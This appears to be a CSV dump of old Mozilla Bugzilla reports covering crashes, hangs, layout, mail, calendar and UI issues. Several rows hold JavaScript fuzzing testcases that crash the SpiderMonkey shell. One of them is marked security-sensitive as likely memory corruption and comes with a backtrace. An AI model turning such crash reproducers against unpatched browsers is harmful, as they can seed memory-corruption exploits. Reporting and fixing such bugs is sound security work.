18076,"When you ""delete"" a deleted message, it should toggle the flag.  Undo delete works sometimes, but you can't easly go back and change the deleted flag on an arbitrary message easily.","IMAP - Cannot undelete (using Delete Key) in ""Mark as deleted"" mode"
18192,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; m18) Gecko/20000909 BuildID:    2000090908  It doesn't matter on the page content nor the page url, if you bookmark a page twice,  mozilla crashes when you do the second bookmark.  Reproducible: Always Steps to Reproduce: 1.bookmark a page 2.Book mark it again 3.Watch mozilla crash.  Actual Results:  Mozilla segment faulted.  Expected Results:  Added the bookmark to the list again with an incremented bookmark number.",Browser crashes on duplicate entries.
18277,"The following testcase crashes on mozilla-central revision 06f0c5e35c3a (build with --enable-posix-nspr-emulation --enable-valgrind --enable-gczeal --disable-tests --disable-profiling --enable-debug --enable-optimize, run with --fuzzing-safe --cpu-count=2 --ion-offthread-compile=off):      function makeArray(...args) {}     function hole2(...args) {       args.length = 5;       return makeArray(...args);     }     loadFile(`       hole2();       f();     `);     function loadFile(lfVarx) {         try {             evaluate(lfVarx);         } catch (lfVare) {             loadFile(lfVarx);         }     }   Backtrace:      received signal SIGSEGV, Segmentation fault.     #0  JS::Value::toGCThing (this=<optimized out>) at dist/include/js/Value.h:778     #1  JS::GCPolicy<JS::Value>::isValid (value=...) at dist/include/js/Value.h:1136     #2  JS::MutableHandle<JS::Value>::set (this=<optimized out>, v=...) at dist/include/js/RootingAPI.h:618     #3  0x00005555560a91e4 in js::jit::DoTypeMonitorFallback (cx=0x7ffff5f17000, frame=0x7fffffff4418, stub=0x7ffff59b9068, value=..., res=...) at js/src/jit/BaselineIC.cpp:1375     #4  0x00000b0de0a9ae3f in ?? ()     [...]     #14 0x0000000000000000 in ?? ()     rax	0x555557c3d280	93825033032320     rbx	0x45172eb3ee0	4747866881760     rcx	0x555556b17728	93825015052072     rdx	0x0	0     rsi	0x7ffff6eeb770	140737336227696     rdi	0x7ffff6eea540	140737336223040     rbp	0x7fffffff4280	140737488306816     rsp	0x7fffffff4280	140737488306816     r8	0x7ffff6eeb770	140737336227696     r9	0x7ffff7fe6cc0	140737354034368     r10	0x58	88     r11	0x7ffff6b927a0	140737332717472     r12	0x7ffff59b9068	140737314001000     r13	0x7fffffff4410	140737488307216     r14	0x7ffff5f17000	140737319628800     r15	0x7fffffff4418	140737488307224     rip	0x55555586dbb9 <JS::MutableHandle<JS::Value>::set(JS::Value const&)+169>     => 0x55555586dbb9 <JS::MutableHandle<JS::Value>::set(JS::Value const&)+169>:	movl   $0x0,0x0        0x55555586dbc4 <JS::MutableHandle<JS::Value>::set(JS::Value const&)+180>:	ud2   Marking s-s because this GC assertion typically indicates some form of memory corruption.","Assertion failure: (ptrBits & 0x7) == 0, at dist/include/js/Value.h:778 or Crash [@ JS::shadow::Realm::compartment] with Rest argument"
18335,From Bugzilla Helper: User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:0.9.7) Gecko/20011221 BuildID:    2001122106  When accessing an https URL for a site that uses a self-signed certificate (https://wiki.burningman.com/) Mozilla crashes.  Reproducible: Always Steps to Reproduce: 1. Type the URL in the location box. Click Go. 2. 3.  Actual Results:  crash  Expected Results:  display page  I can access other https URLs with no problem.,Mozilla instantly crashes when a certain HTTPS URL (using SSL)
18339,Gecko/20020301 Every time I want to go on this web site http://www.linuxgraphic.org I have got a crash of mozilla.  Just occur with this nightly build,Crash with latest nighly build on a web site
18361,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021016 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.2b) Gecko/20021016  When I go to save things I either get a message, or I get nothing.  Nevertheless the result is the same -- no file is saved.    For the URL I gave, I try to click on the button to download Netscape 7.0, and I get an error.  For the URL listed I get an error message box like:  Downloading C:\documents & Settings\<useriid>\Local Settings\Temp\mtzh8fp6.exe  C:\documents & Settings\<useriid>\Local Settings\Temp\mtzh8fp6.exe could not be saved, because the source file could not be read.  Try again later, or contact the server administrator.   For most all JPEGS on the net, they will be displayed in the browser.  However, problems happen when I then do ""Save Image As..."" with the right moust button.  I'll say OK, and then the dialog box goes away.  Nevertheless, no file is saved.  If I search for the filename, there is a <filename>.jpg name located in the: c:\documents & Settings\<username>\Recent\<filename>.jpg.  If you go to copy that to another directory, its actually <filename>.jpg.lnk.  If you try to open that file into the browser, you get the same kind of message as displayed in the other example when downloading Netscape 7.0.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.    Expected Results:   I would expect saving Netscape  7.0 to save a file to disk.  I would expect jpegs I have in my browser to be saved to disk, or at least tell me that it cannot save it. Instead it acts as normal, but no file is found.",Can't seem to be able to save things from the browser.
18438,"The following testcase asserts on mozilla-central revision 4919e8091542 (run with --ion-eager):   eval(""(function() { "" + ""\ var Constr = function( ... property)  {};\ Constr.prototype = 0.0;\ var c = new Constr(  ) ;\ "" + "" })();"");","IonMonkey: Assertion failure: script->types, at ../jsinferinlines.h:992 or Crash [@ js_CreateThisForFunctionWithProto]"
18488,"The following script crashes trunk jsshell:  this.__defineSetter__(0, function(){}); this.watch(0, function(){}); uneval(this);","Crash [@ QuoteString] with setter, watch, uneval"
18499,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021115 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021115  Recent mozilla builds (since 20021112 to today) hangs 100% reproduceably when  pasting an email address in the second (and above) reciepient address input box in the composer.  Stack trace is attached.  After about 5 minutes a dialog is popped up saying    ""A script on this page is causing mozilla to run slowly. If it    continues to run, your computer may become unresponsive. Do you    want to abort the script ? Ok Cancel.""  Note, there is NO javascript running in the browser window (it is blank) and there is no LDAP lookup for addresses enabled !    Reproducible: Always  Steps to Reproduce: 1. Click forward to forward an existing email 2. Paste (don't type) an address in the first ""To:"" input box of the forwarded mail 3. Paste (don't type) an address in the second ""To:"" input box of the forwarded mail 4. Mozilla hangs for about 5 minutes 5. Popup dialog as described above Actual Results:   Mozilla hangs for about 5 minutes  Expected Results:   Not hang, but accept typed/pasted addresses.",sending mail hangs in message compose when entering several recipients
18503,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0  Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Connection: keep-alive Host: www.grc.com Referer: http://www.grc.com/x/ne.dll?rh1dkyd2 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Content-Length: 30 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Cache-Control: max-age=0 Secure: https://www.grc.com Nonsecure: http://www.grc.com MediaPort: 8092  Reproducible: Always Steps to Reproduce: 1.just open the browser 2.run security tests 3.information is being leaked out about what browser a person is using  Actual Results:   Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Connection: keep-alive Host: www.grc.com Referer: http://www.grc.com/x/ne.dll?rh1dkyd2 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Content-Length: 30 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Cache-Control: max-age=0 Secure: https://www.grc.com Nonsecure: http://www.grc.com MediaPort: 8092  Expected Results:   Fix this security flaw please  very critical flaw   Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: en-us,en;q=0.5 Connection: keep-alive Host: www.grc.com Referer: http://www.grc.com/x/ne.dll?rh1dkyd2 User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 Content-Length: 30 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Cache-Control: max-age=0 Secure: https://www.grc.com Nonsecure: http://www.grc.com MediaPort: 8092",security flaw
18578,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051111 Firefox/1.5  I've tested this with various browser versions.  All of the versions of 1.5 (including the 1.5.0.4 which has not been released yet) do not work.  However, all versions of 1.0.x do (even Deer Park).  Additionally, Bon Echo works as well (I only tested Alpha 2).  I have tried with safe-mode as well with no changes.  What is happening is I have a popup window that has a form on it.  The cancel button is tied to a simple javascript window.close, but the save has a postback.  Both close the window.  The cancel button does not cause any problems (nor closing the window with the close button on the window's frame).  However, the save button does cause a crash.  Now, here is a curious fact as well, it seems that it only crashes when certain fields have values within them.  But what is strange is that the feilds are mostly all text boxes.  But some will cause a crash and some will not.  For instance we have a 'short description' (one line) field which does not cause a crash, but filling out a value of the 'long description' (multi line) does.  The generated html is nearly identical.  Our date and currency fields also cause the crash, but not our drop downs or check box fields.  I do not know if this particular bit of information is even relevant, but I thought I would mention it just the same.  I cannot find anything peculiar about the html or javascript.  However, the page is part of an ASP.Net control, so it is difficult to extract a minimum test case (especially since the post-back seems to be necessary to help trigger the crash).  I thought I would post this bug first and continue to try to make a minimum test case.  Reproducible: Always  Steps to Reproduce: 1.  Open edit popup window 2.  Ensure one of the ""naughty"" feilds has a value. 3.  Press the ""save"" button.  Actual Results:   The browser crashes (with talkback coming up).  Expected Results:   The popup window closes.  I will add a talkback crash ID after I have submitted this bug.",Popup window crashes browser on close via javascript [@ nsLayoutUtils::HasPseudoStyle]
18609,"Using build 2001-05-31 on Mac only, and while verifying bug 82195 I found  another reproducible crash on Mac.  1. Launch App to come up in 3-pane window  2. Login to your mail account (mine was imap with copy to sent folder imap) 3. Select New Msg (mine was html compose) 4. Address it and add an attachment so while sending you can stop the send by  trying to close the Compose window. 5. Send and quickly click on the title bar close icon 6. OK the warning that the send isn't finsihed. 7. now File|Quit Crash  here is where it crashed from talkback incident 31206206 .__ptr_glue  nsMsgComposeAndSend::NotifyListenerOnStopCopy() [nsMsgSend.cpp, line 3279]  CopyListener::OnStopCopy() [nsMsgCopy.cpp, line 141]  nsMsgCopyService::ClearRequest() [nsMsgCopyService.cpp, line 161]  nsMsgCopyService::~nsMsgCopyService() [nsMsgCopyService.cpp, line 144]  nsMsgCopyService::Release() [nsMsgCopyService.cpp, line 287]  DeleteEntry() [nsServiceManager.cpp, line 258]  _hashEnumerateRemove() [nsHashtable.cpp, line 367]  PL_HashTableEnumerateEntries() [plhash.c, line 413]  nsHashtable::Reset() [nsHashtable.cpp, line 383]  nsObjectHashtable::Reset() [nsHashtable.cpp, line 626]  nsObjectHashtable::~nsObjectHashtable() [nsHashtable.cpp, line 592]  nsServiceManagerImpl::~nsServiceManagerImpl() [nsServiceManager.cpp, line 283]  nsServiceManagerImpl::Release() [nsServiceManager.cpp, line 292]  nsServiceManager::ShutdownGlobalServiceManager() [nsServiceManager.cpp, line  544]  NS_ShutdownXPCOM() [nsXPComInit.cpp, line 476]  Netscape 6 + 0x5888 (0x1fa41458)  Netscape 6 + 0x1a0a0 (0x1fa55c70)",Progress window not closed when user close the compose window while sending
18615,"seen on commericial trunk builds:  windows 2001-08-02-06-trunk linux 2001-08-02-06-trunk mac 2001-08-02-04-trunk  -Select File | Edit Page -Browse any page.  expected results: the composer should open with the current page in the browser  tested results: The composer doesn't open at all.  Note: a workaround for this is to browse the page, then open the Composer and  from there select File | Recent Pages | ""the earlier browsed page.""  This opens  the page in the composer for editing.",File | Edit Page fails to launch page in composer
18655,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.0.0) Gecko/20020610 BuildID:    2002061015  Mozilla freeze totally when I visit this page, this also happens with RC3 on my laptop (not tried 1.0 there)  many many releases ago the page could be visited, but randomly freezed when clicking on items in the left frame. now it always happens.   Reproducible: Always Steps to Reproduce: 1.Visit http://ferret.wrc.noaa.gov/Ferret/Documentation/Users_Guide/current/fer_html.htm 2. 3.  Actual Results:  freeze",Mozilla freeze when I visit this page.
18682,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5  Plugins such as flash or java (well, ok, so flash uses java...) will try to open /dev/dsp (usually whether or not they actually need it), and then keep it open (if it used it), even after leaving the page (at least in the java case, maybe in the flash case as well).  This is unacceptable.  My current workaround is to keep changing /dev/dsp as from a symlink to my real device and a fake one.  There should be a way to control whether plugins can open the sound device at all, and closing the page that contained such a plugin should release the resouce (instead of forcing an entire browser close).  A corallary to this is the converse.  Some other program, say XMMS, has /dev/dsp open and a plugin is trying to load that wants to open that device (again, it may or may not actually use the device, but it seems to try anyway... esp. flash).  The result is the browser will hang (blocks trying to open the device) until the other process lets go (unfortunately in the case of XMMS this means 'stop' not 'pause' :P).  Reproducible: Always  Steps to Reproduce: 1. Goto a webpage with java with sound (games.yahoo.com has some good ones!) 2. Leave that page 3. lsof /dev/dsp - note the java_vm processes that are spawned from phoenix-bin (as noted from ps afx)  are listed.  Actual Results:   I was unable to play sound again until I closed the entire browser.  Expected Results:   Released the audio device.  My guess is that the java_vm process is left running to speed future loadings of java applets (this is a good idea, in principle, though in linux this is partially nullified by it's great file buffer cache), and that since it's the java_vm that has the device open, forcing it to close it could be difficult (unless the applet was well written and closes it when it exits, if it is even asked to (is that the issue?)). The second case where another app already has the dsp device open and the browser hangs might be harder to fix, since Phoenix isn't in control at that point.  I'm not sure what the interaction is that causes the UI to block, though. Note that I'm pretty sure this all applies equally well to Mozilla proper.",java_vm never releases /dev/dsp
18685,"User-Agent:       Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5 Build Identifier: Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.3a) Gecko/20021207 Phoenix/0.5  When I type the URL http://www.pagesjaunes.fr, Phoenix crash. No more informations ...  Reproducible: Always  Steps to Reproduce: 1.type the URL http://www.pagesjaunes.fr   Actual Results:   Dialague box appear : error in PHOENIX.EXE  Expected Results:   Mozilla work fine.",crash when opening a specific page (don't know which part of the page crash phoenix)
18811,"+++ This bug was initially created as a clone of Bug #1275700 +++  In bug 1275700 the search pop-up was fixed to have a light background, but the `Add ""{$engineName}""` section was missed and is still dark due to searchbar.css:  https://dxr.mozilla.org/mozilla-central/rev/23dc78b7b57e/browser/themes/linux/searchbar.css#212",[Ubuntu] Search Pop-up add new search engine area is too dark
18832,"It appears that mozilla's typeahead feature doesn't work when (hold on to your seats) a IMG tag inside a comment tag inside a table cell that is ABOVE a link. On the attached URL typing a ""p"" to select the first link doesn't work, however, moving the entire <td> line that the image comment is in to below the link fixes it. Removing the comment tags fixes it. Very strange. It's probably a rare case but something I thought it should report. Marking as 'minor' because it's the only place I've been able to find this problem.",Typeahead dies when IMG tag commented out in TABLE
18846,"When you deselect the ""underline links"" option in the preferences:apperance:colors menu, Mozilla fails to comply. The underlined links remain.",Mozilla fails to remove underlines from links when option is selected.
18854,"The font-family attribute in an attached CSS style sheet was ignored. Background colour and width were applied correctly. This occurred in M14 Mozilla.  TABLE.procedure-details-table {   background-color: aqua;   font-family: Arial, sans-serif;   font-size: medium;   width: 80%; }   The table markup was as follows:  <table width=""100%"" cellpadding=""5"" border=""1"" class=""procedure-details-table""> <tr> <td><strong>Author: </strong>David Trudgett</td><td><strong>Create Date: </strong>2000/03/27</td> </tr> <tr> <td colspan=""2""><strong>Aim: </strong>To produce a hardcopy printout of this procedure manual.</td> </tr> </table>",CSS font attribute ignored
18910,"Created attachment 9098208 netmonitor_BlockingUI_noTimings.png  **Affected versions** * 71.0a1 (2019-10-02), 70.0b11, 69.0.1; 68.0.1esr;  **Affected platforms** * Windows 10, macOS 10.13, Ubuntu 16.04.  **Steps to reproduce** 1. Launch FIrefox, open DevTools - Network monitor tab; 2. Block any request; 3. Click on the Timings tab;  **Expected result**  * a message such as ""No timings available for this request"" is displayed such as the case for the Respons, Params tabs;  **Actual result** * Timings section is empty;  **Regression range** * not a regression,  visible after implementation of Bug 1151368; * Pushlog [URL](https://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=30b70a449280e6df10496a51e89c01b8c98bb92e&tochange=2049f94666461e2eff7e67f026730a4932c98788)  **Additional notes** * attached screenshot with the mentioned section",NetMonitor - Timings needs status message if none available from a blocked request
18947,"And does it bug for me?  Not yet How about now? Nope. And not now. Nope.  Now? Nope  Sorry, can't reproduce on command  I DID find a New bug.... Alas, I now can not change the http://bugzilla.mozilla.org/enter_bug.cgi?product=Browserindex.html line by clicking on it.  I'll try to make the next bug report more re-produceable.  (sorry)","An attempt to re-create the form bug, found new one."
19017,During build I get a warning:  j:\mozilla\mozilla\layout\html\content\src\nsHTMLSelectElement.cpp(492) :  warning C4700: local variable 'result' used without having been initialized  which sounds bad.   http://lxr.mozilla.org/seamonkey/source/layout/html/content/src/nsHTMLSelectElem ent.cpp#492    PRUint32 curlen; 489   nsresult result; 490   GetLength(&curlen); 491   if (curlen && (curlen > aLength)) { // Remove extra options 492     for (PRInt32 i = (curlen - 1); (i>=(PRInt32)aLength) &&  NS_SUCCEEDED(result); i--) { 493       result = Remove(i); 494     } 495   } else { // Add options? 496   },Build warning looking serious (uninitialized variable used)
19030,"Page has two columns of unordered lists with 2 levels of nesting.  Looks fine with netscape 4.7 But lists are so misaligned that sometimes list is indented more than it's sublist.  Sorry, page is part of an intranet so I cannot provide an URI",lists are misaligned.
19110,"There were some layout issues that kept bugging me in the Annotations tab, so I decided to improve them a little bit. Specifically:  o the 'Bug' header was computing to a different size vs. 'Classification' headers o the headers aren't aligned across the two panels o the ""This job has not been classified.."" message was italic and not justified o the headers were being rendered even when the was no classification",Tidy up Annotations panel layout
19119,resize / pointer cursor don't change back when leaving window at collapsed sidebar.  This only happens if the cursor stays over the sidebar long enough (moves out of window slowly enough) and again only if the sidebar is collapsed.  It stays as long as I don't manipulate / open any windows.,cursor doesn't change back when leaving window at sidebar
19133,"When an alert dialog box pops-up (e.g. Cookie or Image handling), the default keystroke for each button is not active.  User should be able to simply press 'Y' for YES, 'N' for NO, 'C' for CANCEL, etc.  User is currently forced to use the mouse or tab focus to appropriate button and press ENTER.",Default key not active for buttons in pop-up dialogs
19143,"Created attachment 758121 screenshot_bug_vcard_thunderbird.png  User Agent: Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0 (Beta/Release) Build ID: 20130514164240  Steps to reproduce:  I opened my vCard in the Accounts settings and changed the value of ""Prefers to receive messages fomated as:"" and ""Jabber ID:"". I clicked ok and after that opened the vcard editor again.    Actual results:  My settings were not present. In fact the drop down for the format did not show any viable option but instead was resized to a very flat slab without text.  the Jabber ID   Expected results:  The drop down menu should have showed text with my selection from earlier and the field for the jabber id should have contained the jabber id I entered.",my vCard forgets values (preferred email format and jabber id)
19230,"found using bryner's test builds for bug 141295. i don't think it's due to his patch, since this also occurs with a regular trunk build as well as an rtm (branch) builds.  0. make sure that you have an actual location (textfield in the navigator panel) set for your home page, eg, http://mozilla.org  1. open a new tab (which loads a blank page), or open a new window where your home page pref (the ""navigator startup"" radiobutton) is set to a blank page.  2. as expected, the cursor (and focus) is in the urlbar. now, access your home page: use either alt-home (cmd-home on mac) or Go > Home.  3. try to scroll the page with the keyboard.  results: focus remains in the urlbar (no page scrolling). i need to first hit tab, then focus is moved to the content area.",focus remains in urlbar when accessing home while viewing a blank page
19314,"Branch Builds:  2001060511win98 There is a preference on the send progress window  ""keep this window open after  this message is successfully sent""  But the progress window goes away with the  compose window when the message gets sent even with the preference checked. This  preference does not work on win98.  Mac and linux leaves the window open.  Steps: -Open mail (see bug 28348 to show the progress window while sending message) -compose a new message -attach a big file when sending -when sending mail check on the pref to leave the window open after the mail is  successfully.  Actual results:  The dlg disappears with the compose window after the message is  sent.   Expected: Should stay open when the message gets sent.  Clicking on close button  should close the window.",Prefs to keep window open in the send prg dlg does not work
19454,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Win95; en-US; rv:1.0rc1) Gecko/20020417 BuildID:    20020417 (RC1)  NOTE: I've searched the bugzilla previous bugs, and while some are similar, I can't find one that has this sort of result.  Basically, I surf many pages each day.  Yet *occasionally* (and these events usually happen in clusters) the page comes up with ""no data"" (that little pop-up window).  Even as I reported this bug, I clicked on the bug list for Networking HTTP (http://bugzilla.mozilla.org/buglist.cgi?bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&bug_status=UNCONFIRMED&component=Networking%3A%20HTTP&cmdtype=doit) and it gave me the pop-up.  I retried it, and it worked first time.  This is continually happening - sometimes with form submission, sometimes not.  For example, on trademe.co.nz, it happened 5 min ago when I clicked the site statistics.  I'm still trying to isolate when and why it's happening, but it is definitely happening quite frequently, and it's not the servers - it happens on many sites and as soon as I reload, the page works (99% of the time).  Reproducible: Sometimes Steps to Reproduce: 1.  Surf a lot 2.  Occasionally get ""no data"" popping up 3.  Reload, page works  Actual Results:  Page returns ""no data"", I reload and it works  Expected Results:  Should work first time","Browser keeps coming up with pop-up ""no data"""
19472,"Reproducing : under Windows, with more than one printer declared :  1- click on ""Print"" 2- select a specific printer 3- print the page 4- reclick on ""Print""  Result : the specific printer you selected in step 2 is no longer selected, the default printer is used instead.  Default behaviour for Windows applications (including Netscape 4.x) is to keep the specific printer selection for the duration of the application session.",Printer selection is not kept during the same browser session
19529,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3  Alternate text in image properties is always ""The image [url] cannot be displayed, because it contains errors."" when the image is viewed directly.  Tested in Firefox 1.0.3 and Mozilla 1.8b.  Reproducible: Always  Steps to Reproduce: 1. View an image directly (not via HTML, XUL, etc). 2. Right-click and choose ""Properties"" 3. See the alternate text description  Actual Results:   ""The image [url] cannot be displayed, because it contains errors.""  Expected Results:   Should be nothing, or extract meta data from image, e.g. EXIF, PNG comment, etc.",Wrong alternate text description when image is viewed directly
19599,"User-Agent:       Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8a2) Gecko/20040615 Build Identifier: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8a2) Gecko/20040615  Whenever I install a new nightly build using the Custom install type, the installer selects ALL components in the first place. I'd rather it deselected components that aren't currently installed. On the other hand, the installer should install a recent version of additional components, like the mozilla calendar, when it finds such a component is currently installed.  Reproducible: Always Steps to Reproduce: 1. Download nightly mozilla 2. Install over current installation 3. Select custom installation   Actual Results:   All components are selected  Expected Results:   Select only those components which are currently installed",Custom install over previous installation should respect  previous selection of components
19612,"When I close a tab, I want to be switched to previous tab I saw, not to the nearest tab on the left of closed tab.  WinNT4, mozilla build 2002052360 1.0 RC3",closing tab selects nearest tab to the left
19693,"User-Agent:       Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007 Build Identifier: Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.5) Gecko/20031007  The text above the tabel at http://java.sun.com/products/jlf/ed2/book/Appendix.A.html isn't correctly displayed. It should stand above the table, but it covers the tabel partially.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.",Text in table caption aligned left overlaps table
19700,"Our large View Icons have a variety of problems on WinXP Luna in their pressed state (see 1st attached screenshot). It is not easy to find out, which is the current view mode by looking at the Icon toolbar.  1. In Icons+Text mode, we just distinguish the active view by greying out the button text and by placing the icon one or two pixels below the other view icons (which looks pretty ugly by the way).  2. In Icons mode, we just distinguish the active view placing the icon one or two pixels below the other view icons. Here it is especially hard to determine which is the active view.  3. In Text mode we distinguish the active view by greying out the button text and by placing the icon one or two pixels below the other view icons. Here it looks even more ugly than in Icons+Text mode.   In small icons mode, it is a bit better. The active state of the view icons looks different than the inactive icons by having the inner calendar color by white (see 2nd screenshot).   I would propose to mimic what Firefox does here (Bookmarks or History icon - see 3rd screenshot) for small icons mode and combine the Firefox approach with our small icons approach for the big icons mode.","Large View Icons (Day View, Week View, etc.) don't have a clear pressed state in Win XP Luna default theme"
19716,"moz build: 2001040604 when I browse bookmarks to a folder that requires scroll buttons to view it comepletely, all my bookmark folders get scroll buttons they continue to have scroll buttons (whether they need them or not) throughout the mozilla session upon restarting mozilla the extranious scroll buttons are gone (until I browse to a folder in my bookmarks that needs scroll buttons that is) scroll buttons apprear 100% of the time I fold out a large bookmark folder the buttons should be appearing on ONLY the folders that need them, not everything","when opening a bookmarks menu that needs scroll arrows, ALL parent menus get scroll arrows"
19759,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:0.9.8) Gecko/20020204 BuildID:    2002020406  When Mozilla starts (displays splash), although the pref for using MozillaMail as the default email client is off, Mozilla removes WinXP's default entry for mail clients.  The start menu Email button no longer points to Outlook Express, and the Internet control panel has a blank entry next to the Email program list.  Reproducible: Always Steps to Reproduce: 1. Set something else as the default E-mail client. 2. Disable Use Moz. as the default email app. pref, and restart Mozilla.  Actual Results:  The email entry went blank.  Expected Results:  Mozilla should have left it alone.",Mozilla removes Windows XP's default mail client entry on startup
19819,"When building Mozilla over here in Germany, you get a build id based off Central European Time, whereas when building it at Mountain View, you get it with Pacific Time. That's a difference of 9 hours, which means if at both locations a build were to be created now, the build id would be 2002-06-15-14 at Mountain View and 2002-06-15-23 at Germany - which is confusing. A central time is a lot better.  CVS checkout uses GMT times, so we should do that as well.",Should use GMT time for build ids
19911,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.8) Gecko/20071008 Firefox/2.0.0.8 Build Identifier: Lightning 0.7/2007102304  I have the option to display tasks in calender checked however the tasks are not displayed in the day/week view unless there is a due date selected and the due time is at least 15 min past start time, in which case the text is truncated. The task shows up all the time in the month and multiweek view.   For example, I selected Start date 10/31/2007; 10:00 AM with no due time and it is not shown in calender for the day and week views. It does show up in the month and multiweek view. The same happens if I set the same start date and time and I set a due date for the same day, 10/31/2007 and a due time 10:05 AM (only 5 min duration).  The only way I got it to work is if I set a duration greater than 15 min. in which case the task is displayed in the day and week views somewhat truncated, which is very impractical.   Reproducible: Always  Steps to Reproduce: 1.Select 'View' -> 'Show tasks in Calendar' 2.Create a task 3.Set Start date 10/31/2007; time 10:00 am 4.Set no due date or due date 10/31/2007; time 10:05  5.Hit save and close 6.Go to Day or Week view  Actual Results:   The task is not displayed in the Week or day views but it shows up in the month and multiweek views.  Expected Results:   Display them, I assume.",Tasks are not displayed in day/week view
19928,"Created attachment 301421 screenshot of text not vertically aligned in password info bar  The text, ""Do you want Minefield to remember this password"" is not vertically aligned in the information bar.    seen in today's nightly build.",text in remember password infobar not vertically centered
19931,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b4pre) Gecko/2008021304 Firefox/3.0b4pre Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b4pre) Gecko/2008021304 Firefox/3.0b4pre  At,Download Manager of Trunk, background color is white or system color. But, text color (not selected) is always system color. When Using System High Contrast theme, system text color may be white.     Reproducible: Always  Steps to Reproduce: 1.Change Theme of Windows as High Contrast 2.Download some files 3. Actual Results:   Information text is very hard to read on rows that have white background.  Expected Results:   Text is readable.",[Download Manager] text is hard to read with highcontrast theme.
19934,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3  When the URL in the Location Bar is selected(the entire or part of the URL), the Go button is not displayed.  The Reload button is useful in most situations. However, in some situations the user might wish to navigate to the URL displayed in the Location Bar, instead of reloading the current page. (I.e. the URL in the Location Bar is not always the same as the current page.)  Reproducible: Always  Steps to Reproduce: 1.Enter a URL in the Location Bar. 2.Press Enter or click the Go button. 3.Click or drag to select the URL in the Location Bar. Actual Results:   The Go button is not displayed in the Location Bar.  Expected Results:   The Go button is displayed in the Location Bar.",Go button does not appear when Location Bar gets focus
20051,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:0.9.4+) Gecko/20010922 BuildID:    2001092221  Command+H should be remapped to hide the browser, as all other OS X apps have Command+H mapped to hide the app. This way users won't be confused when they press Command+H and instead of hiding, the browser history comes up instead.  Reproducible: Always Steps to Reproduce: 1. Command + H  Actual Results:  Browser History Shows Up  Expected Results:  Browser should hide itself",Command + H should Hide Browser Instead of Showing History
